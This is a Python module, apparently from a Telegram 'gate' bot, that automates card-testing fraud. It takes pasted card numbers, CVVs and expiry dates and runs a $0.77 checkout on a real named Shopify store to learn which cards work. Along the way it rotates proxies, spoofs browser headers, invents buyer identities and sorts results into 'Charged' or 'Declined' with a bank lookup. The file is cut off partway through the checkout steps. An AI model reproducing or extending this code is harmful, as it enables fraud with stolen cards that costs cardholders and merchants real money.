# BOT/gates/charge/shopify/shopify077.py

import json
import asyncio
import re
import time
import random
import string
import base64
import httpx
import urllib.parse
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
import html
import os
import unicodedata

# Import from helper modules
try:
    from BOT.helper.permissions import auth_and_free_restricted
except ImportError:
    def auth_and_free_restricted(func):
        async def wrapper(client, message):
            return await func(client, message)
        return wrapper

try:
    from BOT.helper.Admins import is_command_disabled, get_command_offline_message
except ImportError:
    def is_command_disabled(command_name: str) -> bool:
        return False
    def get_command_offline_message(command_name: str) -> str:
        return "Command is temporarily disabled."

try:
    from BOT.gc.credit import charge_processor
    CHARGE_PROCESSOR_AVAILABLE = True
except ImportError:
    charge_processor = None
    CHARGE_PROCESSOR_AVAILABLE = False

try:
    from TOOLS.getbin import get_bin_details
except ImportError:
    def get_bin_details(bin_number):
        return {}

try:
    from BOT.helper.filter import extract_cards
    FILTER_AVAILABLE = True
    print("✅ Filter module imported successfully for shopify077")
except ImportError as e:
    print(f"❌ Filter module import error in shopify077: {e}")
    FILTER_AVAILABLE = False

try:
    from BOT.tools.proxy import (
        get_proxy_for_user,
        mark_proxy_success,
        mark_proxy_failed,
        get_random_proxy,
        parse_proxy,
        test_proxy,
        PROXY_ENABLED
    )
    PROXY_SYSTEM_AVAILABLE = True
    print("✅ Proxy system imported successfully for shopify077")
except ImportError as e:
    print(f"❌ Proxy system import error in shopify077: {e}")
    PROXY_SYSTEM_AVAILABLE = False
    def get_proxy_for_user(user_id: int, strategy: str = "random"):
        return None
    def mark_proxy_success(proxy: str, response_time: float):
        pass
    def mark_proxy_failed(proxy: str):
        pass
    def get_random_proxy():
        return None
    def parse_proxy(proxy_str: str):
        return None
    def test_proxy(proxy_str: str):
        return False

# ========== DETAILED LOGGER ==========
class ShopifyLogger:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.check_id = f"SHP077-{random.randint(1000, 9999)}"
        self.start_time = None
        self.step_counter = 0
        self.logs = []

    def start_check(self, card_details):
        self.start_time = time.time()
        self.step_counter = 0
        cc = card_details.split('|')[0] if '|' in card_details else card_details
        masked_cc = cc[:6] + "******" + cc[-4:] if len(cc) > 10 else cc

        log_msg = f"""
🛒 [SHOPIFY CHARGE 0.77$]
   ├── Check ID: {self.check_id}
   ├── User ID: {self.user_id or 'N/A'}
   ├── Card: {masked_cc}
   ├── Start Time: {datetime.now().strftime('%H:%M:%S')}
   └── Target: shopmiddleeastern.com - El Mordjene Vanille
        """
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def add_log(self, message):
        timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
        self.logs.append(f"[{timestamp}] {message}")

    def step(self, step_num, step_name, action, details=None, status="PROCESSING"):
        self.step_counter += 1
        elapsed = time.time() - self.start_time if self.start_time else 0

        status_icons = {
            "PROCESSING": "🔄", "SUCCESS": "✅", "FAILED": "❌",
            "WARNING": "⚠️", "INFO": "ℹ️", "CAPTCHA": "🛡️",
            "DECLINED": "⛔", "HUMAN": "👤", "CLICK": "🖱️",
            "TYPE": "⌨️", "WAIT": "⏳"
        }
        status_icon = status_icons.get(status, "➡️")

        log_msg = f"{status_icon} STEP {step_num:02d}: {step_name}"
        log_msg += f"\n   ├── Action: {action}"
        log_msg += f"\n   ├── Elapsed: {elapsed:.2f}s"
        log_msg += f"\n   ├── Time: {datetime.now().strftime('%H:%M:%S')}"
        if details:
            log_msg += f"\n   └── Details: {details}"

        self.add_log(log_msg)
        print(log_msg)
        print()
        return log_msg

    def data_extracted(self, data_type, value, source=""):
        if isinstance(value, dict):
            value_str = json.dumps(value, indent=2)
            if len(value_str) > 150:
                value_str = value_str[:147] + "..."
        else:
            value_str = str(value)
            if len(value_str) > 100:
                value_str = value_str[:97] + "..."

        log_msg = f"   ├── 📊 Extracted {data_type}: {value_str}"
        if source:
            log_msg += f"\n   │   └── From: {source}"
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def card_details_log(self, cc, mes, ano, cvv):
        masked_cc = cc[:6] + "******" + cc[-4:]
        log_msg = f"""
   ├── 💳 Card Details:
   │   ├── Number: {masked_cc}
   │   ├── Expiry: {mes}/{ano}
   │   └── CVV: {'*' * len(cvv)}
        """
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def error_log(self, error_type, message, step=""):
        error_icons = {
            "CAPTCHA": "🛡️", "DECLINED": "💳", "FRAUD": "🚫",
            "TIMEOUT": "⏰", "CONNECTION": "🔌", "UNKNOWN": "❓",
            "PROXY": "🔧", "NO_PROXY": "🚫", "PCI": "💳",
            "CHECKOUT_TOKEN": "🎫", "PROCESSING": "⏳"
        }
        error_icon = error_icons.get(error_type, "⚠️")
        log_msg = f"{error_icon} ERROR [{error_type}]: {message}"
        if step:
            log_msg += f"\n   └── At Step: {step}"
        self.add_log(log_msg)
        print(log_msg)
        print()
        return log_msg

    def success_log(self, message, details=""):
        log_msg = f"✅ SUCCESS: {message}"
        if details:
            log_msg += f"\n   └── Details: {details}"
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def complete_result(self, success, final_status, response_message, total_time):
        result_icon = "✅" if success else "❌"
        result_text = "APPROVED" if success else "DECLINED"

        if len(response_message) > 100:
            response_display = response_message[:97] + "..."
        else:
            response_display = response_message

        log_msg = f"""
{result_icon} [SHOPIFY CHARGE COMPLETED]
   ├── Check ID: {self.check_id}
   ├── Result: {result_text}
   ├── Final Status: {final_status}
   ├── Steps Completed: {self.step_counter}
   ├── Total Time: {total_time:.2f}s
   ├── Response: {response_display}
   └── End Time: {datetime.now().strftime('%H:%M:%S')}
        """
        summary = f"📊 SUMMARY: {result_icon} {final_status} | {total_time:.2f}s | Steps: {self.step_counter}"
        self.add_log(log_msg)
        self.add_log(summary)
        print(log_msg)
        print(summary)
        print("="*80)
        return log_msg, summary

    def get_all_logs(self):
        return "\n".join(self.logs)


# ========== UTILITY FUNCTIONS ==========
def load_users():
    try:
        with open("DATA/users.json", "r") as f:
            return json.load(f)
    except:
        return {}

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            return json.load(f).get("OWNER")
    except:
        return None

def get_user_plan(user_id):
    users = load_users()
    if str(user_id) in users:
        return users[str(user_id)].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        if not os.path.exists("DATA/banned_users.txt"):
            return False
        with open("DATA/banned_users.txt", "r") as f:
            return str(user_id) in f.read().splitlines()
    except:
        return False

def check_cooldown(user_id, command_type="si"):
    owner_id = load_owner_id()
    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except:
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15) or 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except:
        pass

    return True, 0


# ========== FORMAT RESPONSE FUNCTION ==========
def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, user_data, proxy_status="Dead 🚫"):
    fullcc = f"{cc}|{mes}|{ano}|{cvv}"

    try:
        user_id = str(user_data.get("user_id", "Unknown"))
    except:
        user_id = None

    try:
        with open("DATA/sites.json", "r") as f:
            sites = json.load(f)
        gateway = sites.get(user_id, {}).get("gate", "Shopify Charge 0.77$ 🌯")
    except:
        gateway = "Shopify Charge 0.77$ 🌯"

    raw_response = str(raw_response) if raw_response else "-"
    
    if "TIMEOUT" in raw_response.upper() or "PCI_ERROR" in raw_response.upper():
        status_flag = "Error❗️"
        response_display = "Try again ♻️"
    else:
        if "DECLINED - " in raw_response:
            response_display = raw_response.split("DECLINED - ")[-1]
            response_display = response_display.split('\n')[0].strip()
            if len(response_display) > 30:
                response_display = response_display[:27] + "..."
        elif "ORDER_PLACED" in raw_response.upper() or "PROCESSEDRECEIPT" in raw_response:
            response_display = "ORDER_PLACED"
        elif "APPROVED - " in raw_response:
            response_display = "APPROVED"
        elif "CARD_DECLINED" in raw_response.upper():
            response_display = "CARD_DECLINED"
        elif "GENERIC_ERROR" in raw_response:
            response_display = "GENERIC_ERROR"
        elif "PROXY_DEAD" in raw_response:
            response_display = "PROXY_DEAD"
        elif "NO_PROXY_AVAILABLE" in raw_response:
            response_display = "NO_PROXY_AVAILABLE"
        elif "CAPTCHA" in raw_response.upper():
            response_display = "CAPTCHA"
        elif "3D" in raw_response.upper() or "3DS" in raw_response.upper():
            response_display = "3D_SECURE"
        elif "ACTIONREQUIREDRECEIPT" in raw_response.upper():
            response_display = "3D_SECURE"
        elif "INSUFFICIENT" in raw_response.upper():
            response_display = "INSUFFICIENT_FUNDS"
        elif "INVALID" in raw_response.upper():
            response_display = "INVALID_CARD"
        elif "EXPIRED" in raw_response.upper():
            response_display = "EXPIRED_CARD"
        elif "FRAUD" in raw_response.upper():
            response_display = "FRAUD"
        elif "PROCESSING_TIMEOUT" in raw_response:
            response_display = "PROCESSING_TIMEOUT"
        else:
            response_display = raw_response[:30] + "..." if len(raw_response) > 30 else raw_response

        raw_response_upper = raw_response.upper()

        if any(keyword in raw_response_upper for keyword in [
            "3D", "AUTHENTICATION", "OTP", "VERIFICATION", 
            "3DS", "SECURE REQUIRED", "SECURE_CODE",
            "3DS REQUIRED", "ACTIONREQUIREDRECEIPT",
            "ADDITIONAL_VERIFICATION_NEEDED",
            "VERIFICATION_REQUIRED", "CARD_VERIFICATION", "AUTHENTICATE",
            "COMPLETEPAYMENTCHALLENGE"
        ]):
            status_flag = "Approved ❎"
        elif any(keyword in raw_response_upper for keyword in [
            "CAPTCHA", "BOT_DETECTED", "HUMAN_VERIFICATION", "SECURITY_CHECK",
            "HCAPTCHA", "CLOUDFLARE", "RECAPTCHA"
        ]):
            status_flag = "Captcha ⚠️"
        elif any(keyword in raw_response_upper for keyword in [
            "ORDER_PLACED", "SUBMITSUCCESS", "SUCCESSFUL", "APPROVED",
            "COMPLETED", "PAYMENT_SUCCESS", "CHARGE_SUCCESS", "THANK_YOU",
            "ORDER_CONFIRMED", "CHARGED", "LIVE",
            "ORDER #", "PROCESSEDRECEIPT", "PAYMENT_SUCCESSFUL",
            "PROCESSINGRECEIPT", "AUTHORIZED"
        ]):
            status_flag = "Charged ✅"
        elif "CARD_DECLINED" in raw_response_upper:
            status_flag = "Declined ❌"
        elif "NO RECEIPT ID" in raw_response_upper:
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "THERE WAS AN ISSUE PROCESSING YOUR PAYMENT",
            "CARD WAS DECLINED", "PAYMENT FAILED"
        ]):
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "INSUFFICIENT FUNDS", "INSUFFICIENT_FUNDS"
        ]):
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "INVALID CARD", "CARD_INVALID", "CARD NUMBER IS INVALID"
        ]):
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "EXPIRED", "CARD HAS EXPIRED", "CARD_EXPIRED"
        ]):
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "INVALID CVC", "INCORRECT CVC", "CVC_INVALID", "CVV"
        ]):
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "FRAUD", "FRAUD_SUSPECTED", "SUSPECTED_FRAUD",
            "HIGH_RISK", "SECURITY_VIOLATION", "SUSPICIOUS"
        ]):
            status_flag = "Fraud ⚠️"
        elif "NO_PROXY_AVAILABLE" in raw_response_upper or "PROXY_DEAD" in raw_response_upper:
            status_flag = "Proxy Error 🚫"
        else:
            status_flag = "Declined ❌"

    bin_data = get_bin_details(cc[:6]) or {}
    bin_info = {
        "bin": bin_data.get("bin", cc[:6]),
        "country": bin_data.get("country", "Unknown"),
        "flag": bin_data.get("flag", "🏳️"),
        "vendor": bin_data.get("vendor", "Unknown"),
        "type": bin_data.get("type", "Unknown"),
        "level": bin_data.get("level", "Unknown"),
        "bank": bin_data.get("bank", "Unknown")
    }

    try:
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎭")
        first_name = user_data.get("first_name", "User")
    except:
        plan = "Free"
        badge = "🎭"
        first_name = "User"

    clean_name = re.sub(r'[↑←«~∞🏴]', '', first_name).strip()
    profile_display = f"『{badge}』{clean_name}"

    result = f"""
<b>[#Shopify Charge 0.77$] | #WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{fullcc}</code>
<b>[•] Gateway</b> - <b>Shopify Charge 0.77$</b>
<b>[•] Status</b>- <code>{status_flag}</code>
<b>[•] Response</b>- <code>{response_display}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin</b>: <code>{bin_info['bin']}</code>  
<b>[+] Info</b>: <code>{bin_info['vendor']} - {bin_info['type']} - {bin_info['level']}</code> 
<b>[+] Bank</b>: <code>{bin_info['bank']}</code> 🏦
<b>[+] Country</b>: <code>{bin_info['country']} - [{bin_info['flag']}]</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By</b>: {profile_display} [<code>{plan} {badge}</code>]
<b>[ϟ] Dev</b> ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] T/t</b>: <code>[{timet:.2f} 𝐬]</code> <b>|P/x:</b> [<code>{proxy_status}</code>]
"""
    return result


# ========== UNIVERSAL UNICODE STRIPPER & CARD EXTRACTOR ==========
def strip_all_unicode(text):
    normalized = unicodedata.normalize('NFKD', text)
    ascii_text = normalized.encode('ASCII', 'ignore').decode('ASCII')
    return ascii_text

def intelligent_card_parse(text):
    try:
        if FILTER_AVAILABLE:
            try:
                all_cards, unique_cards = extract_cards(text)
                if unique_cards:
                    first_card = unique_cards[0]
                    parts = first_card.split('|')
                    if len(parts) >= 4:
                        cc = parts[0].strip()
                        mm = parts[1].strip().zfill(2)
                        yy = parts[2].strip()
                        cvv = parts[3].strip()
                        if len(yy) == 4:
                            yy = yy[-2:]
                        if (13 <= len(cc) <= 19 and cc.isdigit() and 
                            mm.isdigit() and 1 <= int(mm) <= 12 and
                            yy.isdigit() and len(yy) in [2, 4] and
                            cvv.isdigit() and len(cvv) in [3, 4]):
                            return cc, mm, yy, cvv
            except:
                pass
        ascii_text = strip_all_unicode(text)
        pipe_pattern = r'(\d{13,19})\s*[\|\:\;]\s*(\d{1,2})\s*[\|\:\;]\s*(\d{2,4})\s*[\|\:\;]\s*(\d{3,4})'
        pipe_match = re.search(pipe_pattern, ascii_text)
        if pipe_match:
            cc = pipe_match.group(1)
            mm = pipe_match.group(2).zfill(2)
            yy = pipe_match.group(3)
            cvv = pipe_match.group(4)
            if len(yy) == 4:
                yy = yy[-2:]
            return cc, mm, yy, cvv
        space_pattern = r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})'
        space_match = re.search(space_pattern, ascii_text)
        if space_match:
            cc = space_match.group(1)
            mm = space_match.group(2).zfill(2)
            yy = space_match.group(3)
            cvv = space_match.group(4)
            if len(yy) == 4:
                yy = yy[-2:]
            return cc, mm, yy, cvv
        digits = re.findall(r'\d+', ascii_text)
        for i in range(len(digits) - 3):
            if (13 <= len(digits[i]) <= 19 and len(digits[i+1]) in [1,2] and 
                len(digits[i+2]) in [2,4] and len(digits[i+3]) in [3,4]):
                cc = digits[i]
                mm = digits[i+1].zfill(2)
                yy = digits[i+2][-2:]
                cvv = digits[i+3]
                if 1 <= int(mm) <= 12:
                    return cc, mm, yy, cvv
    except:
        pass
    return None, None, None, None

def parse_card_input(card_input):
    return intelligent_card_parse(card_input)


# ========== SHOPIFY MIDDLE EASTERN CHECKOUT CLASS ==========
class ShopifyMiddleEasternCheckout:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.base_url = "https://shopmiddleeastern.com"
        self.product_handle = "el-mordjene-vanille-10-g"
        self.variant_id = "39312450584663"
        self.product_id = "6564222206039"
        
        self.proxy_url = None
        self.proxy_status = "Dead 🚫"
        self.proxy_used = False

        self.client = None
        self.pci_client = None

        self.ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'
        self.sec_ch_ua = '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"'

        self.checkout_token = None
        self.session_token = None
        self.receipt_id = None
        self.stable_id = None
        self.queue_token = None
        self.shop_id = "7899283507"
        self.signature = None
        self.pci_build_hash = "a8e4a94"
        
        self.delivery_strategy_handle = None
        self.payment_method_identifier = None
        self.signed_handles = []
        self._r_param = None
        
        self.cookies = {}

        self.logger = ShopifyLogger(user_id)

        self.first_names = ["James", "Robert", "John", "Michael", "David", "William", "Richard", 
                           "Joseph", "Thomas", "Charles", "Daniel", "Matthew", "Anthony", "Mark", 
                           "Donald", "Steven", "Paul", "Andrew", "Kenneth", "Joshua", "Kevin", 
                           "Brian", "George", "Timothy", "Ronald", "Edward", "Jason", "Jeffrey",
                           "Casey", "Mini", "Bruce", "Tony", "Steve", "Peter", "Clark"]
        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", 
                          "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", 
                          "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", 
                          "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Lang", 
                          "Trump", "Walker", "Hall", "Allen", "Young", "King"]

        self.first_name = random.choice(self.first_names)
        self.last_name = random.choice(self.last_names)
        self.full_name = f"{self.first_name} {self.last_name}"
        self.email = f"{self.first_name.lower()}{self.last_name.lower()}{random.randint(10,999)}@gmail.com"
        self.phone = "5152744692"

        self.address = {
            "address1": "3950 N Harlem Ave",
            "address2": "",
            "city": "Chicago",
            "provinceCode": "IL",
            "zip": "60634",
            "countryCode": "US"
        }
        
        self.coordinates = {
            "latitude": 41.9522135,
            "longitude": -87.8076595
        }

    def _update_cookies(self, response):
        try:
            for cookie in response.cookies.jar:
                self.cookies[cookie.name] = cookie.value
        except:
            pass

    def _get_cookie_str(self):
        parts = []
        for k, v in self.cookies.items():
            parts.append("{}={}".format(k, v))
        return "; ".join(parts)

    def _make_headers(self, extra=None):
        h = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'sec-ch-ua': self.sec_ch_ua,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'user-agent': self.ua,
        }
        if extra:
            h.update(extra)
        cookie_str = self._get_cookie_str()
        if cookie_str:
            h['cookie'] = cookie_str
        return h

    async def random_delay(self, min_sec=0.2, max_sec=0.5):
        await asyncio.sleep(random.uniform(min_sec, max_sec))

    def step(self, num, name, action, details=None, status="PROCESSING"):
        return self.logger.step(num, name, action, details, status)

    def extract_checkout_token(self, url):
        """Extract checkout token - only get cn/ path token, skip JWT tokens"""
        # Only match the cn/TOKEN pattern from the path (not JWT query params)
        match = re.search(r'/checkouts/cn/([a-zA-Z0-9]+)', url)
        if match:
            token = match.group(1)
            # Skip JWT tokens (they start with eyJ and are very long)
            if not token.startswith('eyJ') and len(token) < 100:
                return token
        return None
    
    def extract_r_param(self, url):
        match = re.search(r'_r=([^&]+)', url)
        if match:
            return match.group(1)
        return None
    
    def generate_random_string(self, length=16):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def generate_uuid(self):
        return "{}-{}-4{}-{}{}-{}".format(
            self.generate_random_string(8),
            self.generate_random_string(4),
            self.generate_random_string(3),
            random.choice(['8','9','a','b']),
            self.generate_random_string(3),
            self.generate_random_string(12)
        )

    def generate_timestamp(self):
        return str(int(time.time() * 1000))

    def extract_session_token(self, html):
        m = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', html)
        if m:
            self.session_token = m.group(1)
            return self.session_token
        pats = [
            r'"sessionToken"\s*:\s*"(AAEB[^"]+)"',
            r'(AAEB[A-Za-z0-9_\-]{50,})',
        ]
        for pat in pats:
            m = re.search(pat, html)
            if m:
                self.session_token = m.group(1)
                return self.session_token
        return None

    def extract_stable_id(self, html):
        pats = [
            r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"',
            r'stableId[\s:=]+["\'"]([0-9a-f-]{36})',
        ]
        for pat in pats:
            m = re.search(pat, html)
            if m:
                self.stable_id = m.group(1)
                return self.stable_id
        self.stable_id = str(self.generate_uuid())
        return self.stable_id

    def extract_queue_token(self, html):
        m = re.search(r'queueToken&quot;:&quot;([^&]+)&quot;', html)
        if not m:
            m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', html)
        if m:
            self.queue_token = m.group(1)
            return self.queue_token
        return None

    def extract_signature(self, html):
        pats = [
            r'"shopifyPaymentRequestIdentificationSignature"\s*:\s*"(eyJ[^"]+)"',
            r'"identificationSignature"\s*:\s*"(eyJ[^"]+)"',
            r'(eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)',
        ]
        for pat in pats:
            m = re.search(pat, html)
            if m:
                self.signature = m.group(1)
                return self.signature
        return None

    def extract_payment_identifier(self, html):
        m = re.search(r'paymentMethodIdentifier&quot;:&quot;([^&]+)&quot;', html)
        if not m:
            m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', html)
        if m:
            self.payment_method_identifier = m.group(1)
            return self.payment_method_identifier
        return None

    def extract_delivery_strategy(self, html):
        pats = [
            r'"handle"\s*:\s*"([a-f0-9]{32}-[a-f0-9]{32})"',
            r'handle[\s:=]+["\'"]([a-f0-9]{32}-[a-f0-9]{32})',
        ]
        for pat in pats:
            matches = re.findall(pat, html)
            if matches:
                self.delivery_strategy_handle = matches[0]
                return self.delivery_strategy_handle
        return None

    def extract_signed_handles(self, html):
        handles = re.findall(r'"signedHandle"\s*:\s*"([^"]+)"', html)
        if not handles:
            raw = re.findall(r'\\"signedHandle\\":\\"([^\\"]+)', html)
            handles = [h.replace('\\n','').replace('\\r','') for h in raw]
        self.signed_handles = handles
        return handles

    def extract_pci_build_hash(self, html):
        m = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', html)
        if m:
            self.pci_build_hash = m.group(1)
        return self.pci_build_hash

    # ========== STEPS ==========

    async def visit_homepage(self):
        self.step(1, "VISIT HOMEPAGE", "Getting initial cookies")
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'sec-ch-ua': self.sec_ch_ua,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': self.ua,
        }
        try:
            resp = await self.client.get(self.base_url + "/", headers=headers, timeout=30)
            self._update_cookies(resp)
            if resp.status_code == 200:
                self.extract_pci_build_hash(resp.text)
                return True, "HOMEPAGE_OK"
            return False, "Homepage failed: {}".format(resp.status_code)
        except httpx.ProxyError:
            self.proxy_status = "Dead 🚫"
            mark_proxy_failed(self.proxy_url)
            return False, "PROXY_DEAD"
        except httpx.TimeoutException:
            return False, "TIMEOUT"
        except Exception as e:
            return False, "Homepage error: {}".format(str(e)[:50])

    async def visit_product_page(self):
        self.step(2, "VISIT PRODUCT", "Visiting product page")
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'priority': 'u=0, i',
            'referer': self.base_url,
            'sec-ch-ua': self.sec_ch_ua,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': self.ua,
        }
        try:
            resp = await self.client.get(
                "{}/products/{}".format(self.base_url, self.product_handle),
                headers=headers, timeout=30, follow_redirects=True
            )
            self._update_cookies(resp)
            if resp.status_code == 200:
                return True, "PRODUCT_OK"
            return False, "Product page failed: {}".format(resp.status_code)
        except Exception as e:
            return False, "Product error: {}".format(str(e)[:50])

    async def add_to_cart(self):
        self.step(3, "ADD TO CART", "Adding variant {}".format(self.variant_id))
        
        boundary = "----WebKitFormBoundary" + self.generate_random_string(16)
        
        fields = [
            ("quantity", "1"),
            ("form_type", "product"),
            ("utf8", "\xe2\x9c\x93"),
            ("id", self.variant_id),
            ("product-id", self.product_id),
            ("section-id", "template--14796746227799__main"),
            ("sections", "cart-drawer,cart-icon-bubble"),
            ("sections_url", "/products/{}".format(self.product_handle)),
        ]
        
        body_parts = []
        for name, value in fields:
            body_parts.append("--{}".format(boundary))
            body_parts.append('Content-Disposition: form-data; name="{}"'.format(name))
            body_parts.append("")
            body_parts.append(value)
        body_parts.append("--{}--".format(boundary))
        body_parts.append("")
        
        body = "\r\n".join(body_parts)
        
        headers = {
            'accept': 'application/javascript',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'multipart/form-data; boundary={}'.format(boundary),
            'origin': self.base_url,
            'priority': 'u=1, i',
            'referer': '{}/products/{}'.format(self.base_url, self.product_handle),
            'sec-ch-ua': self.sec_ch_ua,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': self.ua,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        try:
            resp = await self.client.post(
                "{}/cart/add".format(self.base_url),
                headers=headers,
                content=body.encode('utf-8'),
                timeout=30
            )
            self._update_cookies(resp)
            if resp.status_code == 200:
                self.logger.data_extracted("Cart", "Added", "Cart Add")
                return True, "CART_OK"
            return False, "Cart add failed: {}".format(resp.status_code)
        except Exception as e:
            return False, "Cart add error: {}".format(str(e)[:50])

    async def go_to_checkout(self):
        self.step(4, "GO TO CHECKOUT", "POST /cart to get redirect")
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': self.base_url,
            'priority': 'u=0, i',
            'referer': '{}/products/{}'.format(self.base_url, self.product_handle),
            'sec-ch-ua': self.sec_ch_ua,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': self.ua,
        }
        
        try:
            resp = await self.client.post(
                "{}/cart".format(self.base_url),
                headers=headers,
                content="updates%5B%5D=1&checkout=",
                timeout=30,
                follow_redirects=False
            )
            self._update_cookies(resp)
            
            if resp.status_code in [302, 301, 303, 307, 308]:
                location = resp.headers.get('location', '')
                self.logger.data_extracted("Redirect Location", location[:100] + "...", "Cart Redirect")
                
                # Extract checkout token from location
                self.checkout_token = self.extract_checkout_token(location)
                self._r_param = self.extract_r_param(location)
                
                # If token not found in initial location, follow the redirect
                if not self.checkout_token:
                    self.logger.data_extracted("Following Redirect", "Token not in first redirect, following...", "Cart Redirect")
                    try:
                        redir_resp = await self.client.get(
                            location,
                            headers={
                                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
                                'accept-language': 'en-US,en;q=0.9',
                                'user-agent': self.ua,
                            },
                            timeout=30,
                            follow_redirects=True
                        )
                        self._update_cookies(redir_resp)
                        final_url = str(redir_resp.url)
                        self.checkout_token = self.extract_checkout_token(final_url)
                        self._r_param = self.extract_r_param(final_url)
                        self.logger.data_extracted("Final URL", final_url[:100] + "...", "After Redirect")
                    except Exception as e2:
                        self.logger.error_log("REDIRECT_FOLLOW", str(e2)[:50])
                
                if self.checkout_token:
                    self.logger.data_extracted("Checkout Token", self.checkout_token[:20] + "...", "Cart redirect")
                    if self._r_param:
                        self.logger.data_extracted("_r Param", self._r_param[:15] + "...", "Cart redirect")
                    return True, location
                return False, "No checkout token in redirect URL"
            return False, "Cart POST failed: {}".format(resp.status_code)
        except Exception as e:
            return False, "Cart POST error: {}".format(str(e)[:50])

    async def get_checkout_page(self):
        self.step(5, "GET CHECKOUT PAGE", "Loading checkout page and extracting tokens")
        
        # Build checkout URL
        checkout_url = "{}/checkouts/cn/{}/en-us".format(self.base_url, self.checkout_token)
        params = []
        if self._r_param:
            params.append("_r={}".format(self._r_param))
        params.append("auto_redirect=false")
        params.append("edge_redirect=true")
        params.append("skip_shop_pay=true")
        if params:
            checkout_url += "?" + "&".join(params)
        
        self.logger.data_extracted("Checkout URL", checkout_url[:100] + "...", "Constructed")
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'referer': self.base_url,
            'sec-ch-ua': self.sec_ch_ua,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
